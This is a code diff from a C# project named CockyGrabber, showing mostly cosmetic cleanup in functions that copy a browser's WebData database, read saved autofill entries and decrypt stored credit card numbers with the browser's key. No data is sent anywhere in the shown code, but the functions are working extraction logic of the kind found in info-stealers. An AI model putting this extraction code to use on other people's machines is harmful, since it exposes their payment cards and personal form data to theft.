@@ -399,12 +399,12 @@ namespace CockyGrabber.Grabbers
 
             return history;
         }
+        
         #endregion
         public IEnumerable<Blink.AutoFill> GetAutoFills()
         {
-
             List<Blink.AutoFill> autoFills = new List<Blink.AutoFill>();
-            if (!WebDataExist()) throw new GrabberException(GrabberError.WebDataNotFound, $"The WebData database could not be found: {WebDataPath}"); // throw a Exception if the History DB was not found
+            if (!WebDataExist()) throw new GrabberException(GrabberError.WebDataNotFound, $"The WebData database could not be found: {WebDataPath}"); // throw a Exception if the WebData DB was not found
 
             // Copy the database to a temporary location because it could be already in use
             string tempFile = CopyToTempFile(WebDataPath);
@@ -422,10 +422,8 @@ namespace CockyGrabber.Grabbers
                         autoFills.Add(new Blink.AutoFill()
                         {
                             // Store retrieved information:
-                            //Id = reader.GetInt32(0),
                             Name = reader.GetString(0),
                             Value = reader.GetString(1),
-                           
                         });
                     }
                 }
@@ -434,19 +432,14 @@ namespace CockyGrabber.Grabbers
             File.Delete(tempFile);
 
             return autoFills;
-
-
-
         }
 
         public IEnumerable<Blink.CreditCard> GetCreditCards() => GetCreditCards(GetKey());
         public IEnumerable<Blink.CreditCard> GetCreditCards(byte[] key) => GetCreditCards(new KeyParameter(key));
-        
         public IEnumerable<Blink.CreditCard> GetCreditCards(KeyParameter key)
         {
-
             List<Blink.CreditCard> creditCards = new List<Blink.CreditCard>();
-            if (!WebDataExist()) throw new GrabberException(GrabberError.WebDataNotFound, $"The WebData database could not be found: {WebDataPath}"); // throw a Exception if the History DB was not found
+            if (!WebDataExist()) throw new GrabberException(GrabberError.WebDataNotFound, $"The WebData database could not be found: {WebDataPath}"); // throw a Exception if the WebData DB was not found
 
             // Copy the database to a temporary location because it could be already in use
             string tempFile = CopyToTempFile(WebDataPath);
@@ -464,12 +457,11 @@ namespace CockyGrabber.Grabbers
                         creditCards.Add(new Blink.CreditCard()
                         {
                             // Store retrieved information:
-                            //Id = reader.GetInt32(0),
                             Name = reader.GetString(0),
                             Month = reader.GetInt32(1),
                             Year = reader.GetInt32(2),
                             Number = BlinkDecryptor.DecryptValue((byte[])reader[3], key),
-                        }); ;
+                        });
                     }
                 }
                 conn.Close();
@@ -477,9 +469,6 @@ namespace CockyGrabber.Grabbers
             File.Delete(tempFile);
 
             return creditCards;
-
-
-
         }
         #region GetBookmarks()
         /// <summary>
